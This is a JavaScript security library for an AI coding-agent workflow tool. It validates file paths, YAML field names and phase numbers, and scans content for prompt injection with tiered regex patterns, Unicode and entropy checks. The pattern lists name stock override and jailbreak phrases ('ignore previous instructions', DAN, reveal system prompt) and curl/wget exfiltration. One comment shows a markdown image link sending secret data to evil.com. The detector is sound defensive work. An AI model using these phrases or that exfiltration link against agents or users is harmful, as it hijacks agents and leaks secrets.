/**
 * Security — Input validation, path traversal prevention, and prompt injection guards
 *
 * LAYER: Library (called from cmd* functions, not from hooks)
 * THREAT: Data-layer attacks — malicious inputs in CLI args and .planning/ file content
 *
 * Adapted from upstream commit 62db008 (PR #1258) for NG's Claude-only attack surface.
 * Multi-runtime paths and validateShellArg stripped (NG uses execFileSync everywhere).
 * validatePhaseNumber restricted to numeric formats only (no PROJ-42 project IDs in NG).
 * sanitizeForPrompt rewritten as advisory — prepends warning marker, never strips content.
 *
 * Phase 40 evolution (SEC40-TIER, SEC40-WRAP, SEC40-LOG, SEC40-UNICODE, SEC40-PATTERNS):
 *   - scanForInjection extended to return tiered results {clean, findings, blocked, tier}
 *   - INJECTION_PATTERNS_TIERED: classified patterns with {pattern, confidence: 'high'|'medium'}
 *   - Unicode bidi/zero-width detection is now default-on (was opt-in via opts.strict)
 *   - 4 new injection patterns: markdown image exfil, HTML comment, base64+execute, tool output indirect
 *   - wrapUntrustedContent / stripUntrustedWrappers: XML helpers for external content segregation
 *   - logSecurityEvent: runtime-aware JSONL security event logger (follows guardrail-events.log pattern)
 *   - INJECTION_PATTERNS kept unchanged for backward compatibility (11 entries)
 *
 * Phase 40.1 evolution (SEC41-ENTROPY, SEC41-PREFIX, SEC41-CONFIG):
 *   - Shannon entropy per-segment scanning (H > 5.5, 256-char sliding windows)
 *   - opts.entropy and opts.cwd parameters for entropy control and config reading
 *   - 3 new high-confidence patterns: ADMIN OVERRIDE, DAN family, JAILBREAK
 *   - Global config toggle: workflow.entropy_scanning in .planning/config.json
 *
 * Separation from gsd-guardrail.js (SEC-03):
 *   - gsd-guardrail.js = PreToolUse hook = behavioral layer
 *     Question: "Is the agent staying within GSD workflow scope?"
 *     Triggers: when agent uses Edit/Write/EnterPlanMode tools
 *     Action: emit additionalContext advisory, never block
 *
 *   - security.cjs = input validation library = data layer
 *     Question: "Is this input safe from traversal/injection?"
 *     Triggers: called by cmd* functions when processing user args + file content
 *     Action: throw for path traversal (strict), warn for injection (advisory)
 *
 * These layers are fully independent. security.cjs does NOT import gsd-guardrail.js.
 * gsd-guardrail.js does NOT import security.cjs. No shared code, no import relationship.
 * Upstream's gsd-prompt-guard.js hook (which wraps security.cjs in upstream) does NOT
 * exist in NG — NG's adaptation wires security.cjs at the library layer instead.
 */

'use strict';

const fs = require('fs');
const path = require('path');

// ─── Injection patterns (legacy — backward compat) ────────────────────────────

/**
 * LLM-targeted prompt injection regex patterns.
 * Advisory-only: matches are logged/warned, never used to block operations.
 *
 * Adopted from upstream 62db008. Key exclusions for GSD legitimate use:
 *   - "act as a plan" / "act as a phase" / "act as a wave" → allowed (GSD uses these)
 *   - "<instructions>" tag → allowed (GSD uses it as prompt structure in agent files)
 *
 * BACKWARD COMPAT: This array is unchanged from Phase 31. Existing callers using
 * `const { clean, findings } = scanForInjection(content)` continue to work.
 * New code should use INJECTION_PATTERNS_TIERED for tiered confidence classification.
 *
 * Exported for test visibility.
 */
const INJECTION_PATTERNS = [
  // Direct instruction override
  /ignore\s+(all\s+)?previous\s+instructions/i,
  /override\s+(system|previous)\s+(prompt|instructions)/i,
  // Role/identity manipulation
  /you\s+are\s+now\s+(?:a|an|the)\s+/i,
  /act\s+as\s+(?:a|an|the)\s+(?!plan|phase|wave)/i, // allow "act as a plan/phase/wave"
  /pretend\s+(?:you(?:'re| are)\s+|to\s+be\s+)/i,
  // System prompt extraction
  /(?:print|output|reveal|show|display|repeat)\s+(?:your\s+)?(?:system\s+)?(?:prompt|instructions)/i,
  // Hidden instruction markers
  /<\/?(?:system|assistant|human)>/i, // Note: <instructions> excluded — GSD uses it
  /\[SYSTEM\]/i,
  /<<\s*SYS\s*>>/i,
  // Exfiltration
  /(?:send|post|fetch|curl|wget)\s+(?:to|from)\s+https?:\/\//i,
  // Tool manipulation
  /(?:run|execute|call|invoke)\s+(?:the\s+)?(?:bash|shell|exec|spawn)\s+(?:tool|command)/i,
];

// ─── Tiered injection patterns (Phase 40) ─────────────────────────────────────

/**
 * Tiered LLM-targeted prompt injection patterns.
 * Each entry has {pattern: RegExp, confidence: 'high'|'medium'}.
 *
 * HIGH confidence — unambiguous attack indicators that should block external operations.
 * These patterns are highly specific to attack payloads and have very low false-positive
 * rates in GSD's .planning/ corpus.
 *
 * MEDIUM confidence — advisory-only patterns that could appear in legitimate security
 * discussions, code examples, or documentation. These are warnings only.
 *
 * GSD allow-list exclusions (same as INJECTION_PATTERNS):
 *   - "act as a plan/phase/wave" → allowed (GSD agent files legitimately use these)
 *   - "<instructions>" tag → allowed (GSD uses it as prompt structure)
 *
 * 4 upstream-dropped patterns disposition (from Phase 31 adaptation):
 *   1. Unicode RTL/LTR bidi override chars — RESTORED as default-on (Phase 40 decision)
 *   2. Unicode zero-width chars — RESTORED as default-on (Phase 40 decision)
 *   3. OpenAI/GPT-specific system token patterns — CONFIRMED DROPPED (Claude-only surface;
 *      existing tag patterns cover semantic equivalent; would add noise without value)
 *   4. Multi-runtime tool name patterns — CONFIRMED DROPPED (execFileSync array args
 *      everywhere; existing "run/execute bash/shell" pattern covers the threat adequately)
 */
const INJECTION_PATTERNS_TIERED = [
  // ── HIGH confidence — unambiguous attack indicators ─────────────────────────
  // Direct instruction override — the canonical prompt injection attack
  // Covers: "ignore all previous instructions", "ignore the above directions", etc.
  {
    pattern:
      /ignore\s+(?:all\s+)?(?:the\s+)?(?:previous|above|prior)\s+(?:instructions?|directions?|rules?)/i,
    confidence: 'high',
  },
  // System/previous override — "override system prompt", "SYSTEM OVERRIDE: new instructions"
  {
    pattern:
      /(?:override|OVERRIDE)\s+(?:system|previous)\s+(?:prompt|instructions)|SYSTEM\s+OVERRIDE\s*:/i,
    confidence: 'high',
  },
  // Hidden instruction markers — <system>, <assistant>, <human> tags
  { pattern: /<\/?(?:system|assistant|human)>/i, confidence: 'high' },
  // [SYSTEM] marker
  { pattern: /\[SYSTEM\]/i, confidence: 'high' },
  // Llama-style <<SYS>> marker
  { pattern: /<<\s*SYS\s*>>/i, confidence: 'high' },
  // Markdown image exfiltration: ![x](https://evil.com/steal?data=secret)
  // Detects image links with suspicious query params (data, token, key, secret, content)
  {
    pattern:
      /!\[.*?\]\(https?:\/\/[^)]*\?[^)]*(?:data|token|key|secret|content)[^)]*\)/i,
    confidence: 'high',
  },
  // ADMIN OVERRIDE: authority claim variant (case-insensitive)
  { pattern: /ADMIN\s+OVERRIDE\s*:/i, confidence: 'high' },
  // DAN jailbreak family: "DAN:", "DAN mode", "Do Anything Now" (case-insensitive)
  {
    pattern: /\bDAN\s*(?::|mode\b)|Do\s+Anything\s+Now\b/i,
    confidence: 'high',
  },
  // JAILBREAK prefix: explicit jailbreak label (case-insensitive)
  { pattern: /\bJAILBREAK\s*(?::|mode\b)|\bJAILBREAK\b/i, confidence: 'high' },

  // ── MEDIUM confidence — advisory-only (could be legitimate in security docs) ─
  // Role/identity manipulation
  { pattern: /you\s+are\s+now\s+(?:a|an|the)\s+/i, confidence: 'medium' },
  // act as [role] — with GSD allow-list: "act as a plan/phase/wave" excluded
  {
    pattern: /act\s+as\s+(?:a|an|the)\s+(?!plan|phase|wave)/i,
    confidence: 'medium',
  },
  // Pretend to be / pretend you're
  {
    pattern: /pretend\s+(?:you(?:'re| are)\s+|to\s+be\s+)/i,
    confidence: 'medium',
  },
  // System prompt extraction
  {
    pattern:
      /(?:print|output|reveal|show|display|repeat)\s+(?:your\s+)?(?:system\s+)?(?:prompt|instructions)/i,
    confidence: 'medium',
  },
  // Network exfiltration (could appear in legitimate code examples)
  {
    pattern: /(?:send|post|fetch|curl|wget)\s+(?:to|from)\s+https?:\/\//i,
    confidence: 'medium',
  },
  // Tool manipulation (could appear in shell scripting docs)
  {
    pattern:
      /(?:run|execute|call|invoke)\s+(?:the\s+)?(?:bash|shell|exec|spawn)\s+(?:tool|command)/i,
    confidence: 'medium',
  },
  // HTML comment injection: <!-- ignore all previous instructions -->
  // Attackers hide instructions in HTML comments to bypass text-level scanning
  {
    pattern: /<!--.*?(?:ignore|override|system|instructions|execute).*?-->/is,
    confidence: 'medium',
  },
  // Base64 + execute combination: "decode and execute base64payload"
  // Attackers encode malicious payloads to bypass pattern detection
  {
    pattern: /(?:decode|base64)[^.]{0,30}(?:execute|follow|apply|run)/i,
    confidence: 'medium',
  },
  // Tool output / search result indirect injection
  // Attacker plants instructions in tool output that agent will process
  {
    pattern:
      /(?:tool(?:\s+output)?|search\s+result|webpage\s+content|external\s+data)[^.]{0,40}(?:ignore|override|forget|disregard)\s+(?:previous|prior|above|all)/i,
    confidence: 'medium',
  },
];

// ─── validatePath ─────────────────────────────────────────────────────────────

/**
 * Validate that filePath is safely contained within baseDir.
 * Uses fs.realpathSync on both sides to handle OS-level symlinks (macOS /var → /private/var).
 *
 * @param {string} filePath - User-supplied path (relative or absolute)
 * @param {string} baseDir  - Allowed base directory
 * @param {object} [opts]   - Options (reserved for future use)
 * @returns {{ safe: boolean, resolved: string, error?: string }}
 */
function validatePath(filePath, baseDir, opts = {}) {
  if (!filePath || typeof filePath !== 'string') {
    return { safe: false, resolved: '', error: 'Empty or invalid file path' };
  }

  // Reject null bytes — can bypass path checks in some environments
  if (filePath.includes('\0')) {
    return { safe: false, resolved: '', error: 'Path contains null bytes' };
  }

  // Resolve symlinks in base directory to handle macOS /var -> /private/var
  let resolvedBase;
  try {
    resolvedBase = fs.realpathSync(path.resolve(baseDir));
  } catch {
    resolvedBase = path.resolve(baseDir);
  }

  // Resolve target path relative to the real base
  const targetAbsolute = path.resolve(resolvedBase, filePath);

  // Resolve symlinks in target path; for non-existent paths, resolve parent + append basename
  let resolvedTarget;
  try {
    resolvedTarget = fs.realpathSync(targetAbsolute);
  } catch (err) {
    if (err.code === 'ENOENT') {
      // File doesn't exist yet — resolve parent dir and append filename
      try {
        const parentReal = fs.realpathSync(path.dirname(targetAbsolute));
        resolvedTarget = path.join(parentReal, path.basename(targetAbsolute));
      } catch {
        resolvedTarget = targetAbsolute;
      }
    } else {
      resolvedTarget = targetAbsolute;
    }
  }

  // Containment check: target must equal base or be strictly inside it
  const safe =
    resolvedTarget === resolvedBase ||
    (resolvedTarget + path.sep).startsWith(resolvedBase + path.sep);

  if (safe) {
    return { safe: true, resolved: resolvedTarget };
  } else {
    return {
      safe: false,
      resolved: resolvedTarget,
      error: 'Path escapes allowed directory',
    };
  }
}

// ─── requireSafePath ─────────────────────────────────────────────────────────

/**
 * Like validatePath but throws on failure.
 * Use wherever path traversal is unambiguously wrong (CLI file args, .planning/ writes).
 *
 * @param {string} filePath  - User-supplied path
 * @param {string} baseDir   - Allowed base directory
 * @param {string} [label]   - Descriptive label for error messages
 * @param {object} [opts]    - Passed through to validatePath
 * @returns {string} The resolved (real) path
 * @throws {Error} If path is unsafe
 */
function requireSafePath(filePath, baseDir, label, opts = {}) {
  const result = validatePath(filePath, baseDir, opts);
  if (!result.safe) {
    throw new Error(`${label || 'Path'} validation failed: ${result.error}`);
  }
  return result.resolved;
}

// ─── Entropy helpers (Phase 40.1 — not exported) ─────────────────────────────

/**
 * Shannon entropy: H = -sum(p_i * log2(p_i)) for each unique character.
 * Returns bits/char for the given string segment.
 * @param {string} segment
 * @returns {number}
 */
function shannonEntropy(segment) {
  const freq = {};
  for (const ch of segment) freq[ch] = (freq[ch] || 0) + 1;
  let H = 0;
  for (const count of Object.values(freq)) {
    const p = count / segment.length;
    H -= p * Math.log2(p);
  }
  return H;
}

/**
 * Replace fenced code blocks (``` delimited) with spaces of equal length.
 * Preserves character offsets for entropy finding messages.
 * @param {string} content
 * @returns {string}
 */
function stripFencedCodeBlocks(content) {
  return content.replace(/```[\s\S]*?```/g, (match) =>
    ' '.repeat(match.length),
  );
}

/**
 * Merge overlapping or adjacent entropy regions, keeping the max H value.
 * Regions are sorted by start offset, then merged if curr.start <= prev.end.
 * @param {Array<{start: number, end: number, H: number}>} regions
 * @returns {Array<{start: number, end: number, H: number}>}
 */
function mergeRegions(regions) {
  if (regions.length === 0) return [];
  const sorted = regions.slice().sort((a, b) => a.start - b.start);
  const result = [{ ...sorted[0] }];
  for (let i = 1; i < sorted.length; i++) {
    const last = result[result.length - 1];
    const curr = sorted[i];
    if (curr.start <= last.end) {
      last.end = Math.max(last.end, curr.end);
      last.H = Math.max(last.H, curr.H);
    } else {
      result.push({ ...curr });
    }
  }
  return result;
}

/**
 * Check if entropy scanning is globally enabled via config.json.
 * Returns true when config is missing or unreadable (enabled by default).
 * @param {string} cwd - Project root
 * @returns {boolean}
 */
function isEntropyGloballyEnabled(cwd) {
  try {
    const configPath = path.join(cwd, '.planning', 'config.json');
    const cfg = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    return cfg.workflow?.entropy_scanning !== false;
  } catch {
    return true;
  }
}

// ─── scanForInjection ────────────────────────────────────────────────────────

/**
 * Scan content for LLM-targeted prompt injection patterns.
 * Returns tiered results — advisory for medium patterns, blocking for high patterns.
 *
 * Phase 40 change: Returns {clean, findings, blocked, tier} — backward compatible.
 * Existing callers using `const { clean, findings } = scanForInjection(content)` continue to work.
 * Unicode bidi/zero-width detection is now default-on (was gated by opts.strict in Phase 31).
 *
 * Phase 40.1 change: Entropy scanning activated by opts.external=true or opts.entropy=true.
 * opts.entropy=false overrides opts.external=true to disable entropy scanning.
 * opts.cwd enables global config toggle reading from .planning/config.json.
 *
 * @param {string} content   - Text to scan (e.g., .planning/ file content)
 * @param {object} [opts]
 * @param {boolean} [opts.strict] - If explicitly false, disables Unicode detection. Default: on.
 * @param {boolean} [opts.external] - If true, activates external content mode (semantic only).
 * @param {boolean} [opts.entropy] - Explicit entropy control. When true, enables entropy scanning. When false, disables it (overrides opts.external).
 * @param {string} [opts.cwd] - Project root for config.json reading. Required for global entropy toggle. When absent, global toggle is bypassed.
 * @returns {{ clean: boolean, findings: string[], blocked: string[], tier: 'clean'|'medium'|'high' }}
 */
function scanForInjection(content, opts = {}) {
  if (!content || typeof content !== 'string') {
    return { clean: true, findings: [], blocked: [], tier: 'clean' };
  }

  const findings = [];
  const blocked = [];

  // Scan against tiered patterns
  for (const { pattern, confidence } of INJECTION_PATTERNS_TIERED) {
    if (pattern.test(content)) {
      if (confidence === 'high') {
        blocked.push(pattern.toString());
      } else {
        findings.push(pattern.toString());
      }
    }
  }

  // Unicode bidi/zero-width detection — default-on in Phase 40
  // (was opts.strict-gated in Phase 31; now opt-out: opts.strict !== false)
  if (opts.strict !== false) {
    // Unicode bidirectional override and zero-width characters can hide injections
    const rtlLtrOverride = /[\u202A-\u202E\u2066-\u2069]/;
    const zeroWidth = /[\u200B\u200C\u200D\uFEFF]/;
    if (rtlLtrOverride.test(content)) {
      findings.push('Unicode RTL/LTR override characters detected');
    }
    if (zeroWidth.test(content)) {
      findings.push('Unicode zero-width characters detected');
    }
  }

  // Entropy scanning (Phase 40.1) — statistical detection for obfuscated payloads
  // Activated by: opts.entropy=true OR (opts.external=true AND opts.entropy!==false)
  // Deactivated by: opts.entropy=false OR global config workflow.entropy_scanning=false
  const entropyEnabled =
    opts.entropy === true || (opts.external === true && opts.entropy !== false);
  const globalEnabled = opts.cwd ? isEntropyGloballyEnabled(opts.cwd) : true;

  if (entropyEnabled && globalEnabled) {
    const WINDOW = 256;
    const STEP = 128;
    const MIN_SEGMENT = 64;
    const THRESHOLD = 5.5;

    const scannable = stripFencedCodeBlocks(content);

    if (scannable.length >= MIN_SEGMENT) {
      const flaggedRegions = [];

      for (let i = 0; i + WINDOW <= scannable.length; i += STEP) {
        const segment = scannable.slice(i, i + WINDOW);
        const H = shannonEntropy(segment);
        if (H > THRESHOLD) {
          flaggedRegions.push({ start: i, end: i + WINDOW, H });
        }
      }

      // Handle tail segment: remaining chars after last full window
      const lastFullWindowStart =
        Math.floor((scannable.length - WINDOW) / STEP) * STEP;
      const tailStart = lastFullWindowStart + STEP;
      if (
        tailStart < scannable.length &&
        scannable.length - tailStart >= MIN_SEGMENT
      ) {
        const segment = scannable.slice(tailStart);
        const H = shannonEntropy(segment);
        if (H > THRESHOLD) {
          flaggedRegions.push({ start: tailStart, end: scannable.length, H });
        }
      }

      // Merge overlapping/adjacent flagged regions (due to 50% window overlap)
      const merged = mergeRegions(flaggedRegions);
      for (const { start, end, H } of merged) {
        findings.push(
          `[entropy] High entropy segment (H=${H.toFixed(2)}, offset ${start}-${end})`,
        );
      }
    }
  }

  const tier =
    blocked.length > 0 ? 'high' : findings.length > 0 ? 'medium' : 'clean';
  return {
    clean: blocked.length === 0 && findings.length === 0,
    findings,
    blocked,
    tier,
  };
}

// ─── sanitizeForPrompt ───────────────────────────────────────────────────────

/**
 * Advisory wrapper around scanForInjection.
 * When injection is detected, prepends a warning marker including tier. NEVER strips content.
 * Agents receiving the output see the warning and can assess intent.
 *
 * Phase 40 change: Warning now includes tier information from tiered scan.
 *
 * @param {string} content  - Text to sanitize
 * @param {object} [opts]   - Passed through to scanForInjection
 * @returns {string} Content unchanged (if clean) or warning-prepended (if injection found)
 */
function sanitizeForPrompt(content, opts = {}) {
  const result = scanForInjection(content, opts);
  if (result.clean) {
    return content;
  }
  // Prepend advisory warning with tier — never strip or escape original content
  const allFindings = [...result.blocked, ...result.findings];
  return `[SECURITY WARNING: potential injection detected (tier: ${result.tier}) — ${allFindings.join('; ')}]\n\n${content}`;
}

// ─── wrapUntrustedContent ────────────────────────────────────────────────────

/**
 * Wrap external/untrusted content in XML tags for structural segregation.
 * Wrapped content is clearly delineated so agents can assess its provenance and
 * apply appropriate skepticism.
 *
 * Pattern: <untrusted-content source="github:#42">
 *   {content}
 * </untrusted-content>
 *
 * @param {string} content  - Content from external source (e.g., GitHub issue body)
 * @param {string} source   - Source identifier (e.g., 'github:#42', 'gitlab:!123')
 * @returns {string} Content wrapped in <untrusted-content> XML tags
 */
function wrapUntrustedContent(content, source) {
  return `<untrusted-content source="${source}">\n${content}\n</untrusted-content>`;
}

// ─── stripUntrustedWrappers ──────────────────────────────────────────────────

/**
 * Remove <untrusted-content> wrapper tags, preserving inner content.
 * Used when building outbound content (PR bodies, issue comments) — wrapper tags
 * are for internal agent use and should not appear in external systems.
 *
 * @param {string} content  - Content potentially containing <untrusted-content> wrappers
 * @returns {string} Content with wrapper tags removed, inner content preserved
 */
function stripUntrustedWrappers(content) {
  return content.replace(
    /<untrusted-content[^>]*>([\s\S]*?)<\/untrusted-content>/g,
    '$1',
  );
}

// ─── logSecurityEvent ────────────────────────────────────────────────────────

/**
 * Write a security event to the runtime-aware JSONL security log.
 * Follows the same pattern as guardrail-events.log in gsd-guardrail.js.
 *
 * Log path determination (in priority order):
 *   1. GSD_SECURITY_LOG_DIR env var — override for testing and CI
 *   2. GSD_RUNTIME=copilot → {cwd}/.github/logs/security-events.log
 *   3. Default/GSD_RUNTIME=claude → {cwd}/.claude/logs/security-events.log
 *
 * Always fails silently — log failures must never propagate to callers.
 *
 * @param {string} cwd       - Project root directory
 * @param {object} eventData - Event fields to log (source, tier, findings, etc.)
 */
function logSecurityEvent(cwd, eventData) {
  try {
    // Runtime-aware log path: .claude/logs/ for Claude Code, .github/logs/ for Copilot CLI
    // GSD_SECURITY_LOG_DIR env var overrides for testing
    // GSD_RUNTIME env var determines runtime directory (set during install)
    let logDir;
    if (process.env.GSD_SECURITY_LOG_DIR) {
      logDir = process.env.GSD_SECURITY_LOG_DIR;
    } else {
      const runtimeDir =
        process.env.GSD_RUNTIME === 'copilot' ? '.github' : '.claude';
      logDir = path.join(cwd, runtimeDir, 'logs');
    }
    fs.mkdirSync(logDir, { recursive: true });
    const logFile = path.join(logDir, 'security-events.log');
    const entry = JSON.stringify({
      ts: new Date().toISOString(),
      event: 'injection_detected',
      ...eventData,
    });
    fs.appendFileSync(logFile, entry + '\n');
  } catch {
    // Silent fail — matches guardrail-events.log pattern
    // Log failures must never propagate to callers or break tool operations
  }
}

// ─── validatePhaseNumber ─────────────────────────────────────────────────────

/**
 * Validate that a phase number matches NG's numeric-only phase format.
 * Accepts: "31", "12A", "15.1", "12.1.2"
 * Rejects: "PROJ-42", "../../etc", arbitrary strings
 *
 * NG phases are always numeric. The upstream PROJ-42 project ID branch is excluded
 * because NG's supported issue trackers (GitHub, GitLab, Forgejo, Gitea) use #number
 * format and NG phases are never keyed on project IDs.
 *
 * @param {string} phase
 * @returns {{ valid: boolean, normalized?: string, error?: string }}
 */
function validatePhaseNumber(phase) {
  if (!phase || typeof phase !== 'string') {
    return { valid: false, error: 'Phase number is required' };
  }

  const trimmed = phase.trim();
  if (!trimmed) {
    return { valid: false, error: 'Phase number is required' };
  }

  // Numeric-only formats: 1, 01, 12A, 15.1, 12.1.2, 12A.1.2
  if (/^\d{1,4}[A-Z]?(?:\.\d{1,3})*$/i.test(trimmed)) {
    return { valid: true, normalized: trimmed };
  }

  return { valid: false, error: `Invalid phase number format: "${trimmed}"` };
}

// ─── validateFieldName ───────────────────────────────────────────────────────

/**
 * Validate a field name used in YAML frontmatter and state.cjs dynamic RegExp patterns.
 * Prevents YAML injection and regex injection via field names.
 *
 * Rejects:
 *   - Empty or non-string input
 *   - YAML key separator ":"
 *   - Newlines "\n" or "\r" (YAML multi-line injection)
 *   - Null bytes "\0"
 *   - YAML flow indicators "{", "}", "[", "]"
 *   - YAML comment "#" at start of field
 *   - YAML directive "%" at start of field
 *   - Length > 100 characters
 *
 * @param {string} field
 * @returns {{ valid: boolean, normalized?: string, error?: string }}
 */
function validateFieldName(field) {
  if (!field || typeof field !== 'string') {
    return { valid: false, error: 'Field name is required' };
  }

  const trimmed = field.trim();

  if (!trimmed) {
    return { valid: false, error: 'Field name is required' };
  }

  if (trimmed.length > 100) {
    return {
      valid: false,
      error: `Field name exceeds 100 character limit (${trimmed.length} chars)`,
    };
  }

  // YAML key separator — would create nested key injection
  if (trimmed.includes(':')) {
    return {
      valid: false,
      error: 'Field name contains YAML key separator ":"',
    };
  }

  // Newlines — would inject YAML content on next line
  if (trimmed.includes('\n') || trimmed.includes('\r')) {
    return { valid: false, error: 'Field name contains newline characters' };
  }

  // Null byte
  if (trimmed.includes('\0')) {
    return { valid: false, error: 'Field name contains null bytes' };
  }

  // YAML flow indicators — could break inline mappings/sequences
  if (
    trimmed.includes('{') ||
    trimmed.includes('}') ||
    trimmed.includes('[') ||
    trimmed.includes(']')
  ) {
    return {
      valid: false,
      error: 'Field name contains YAML flow indicators ({ } [ ])',
    };
  }

  // YAML comment character at start
  if (trimmed.startsWith('#')) {
    return {
      valid: false,
      error: 'Field name starts with YAML comment character "#"',
    };
  }

  // YAML directive at start
  if (trimmed.startsWith('%')) {
    return {
      valid: false,
      error: 'Field name starts with YAML directive character "%"',
    };
  }

  return { valid: true, normalized: trimmed };
}

// ─── Exports ──────────────────────────────────────────────────────────────────

module.exports = {
  validatePath,
  requireSafePath,
  scanForInjection,
  sanitizeForPrompt,
  validatePhaseNumber,
  validateFieldName,
  wrapUntrustedContent,
  stripUntrustedWrappers,
  logSecurityEvent,
  INJECTION_PATTERNS, // backward compat — 11-element array unchanged
  INJECTION_PATTERNS_TIERED, // Phase 40 — tiered patterns with confidence classification
};
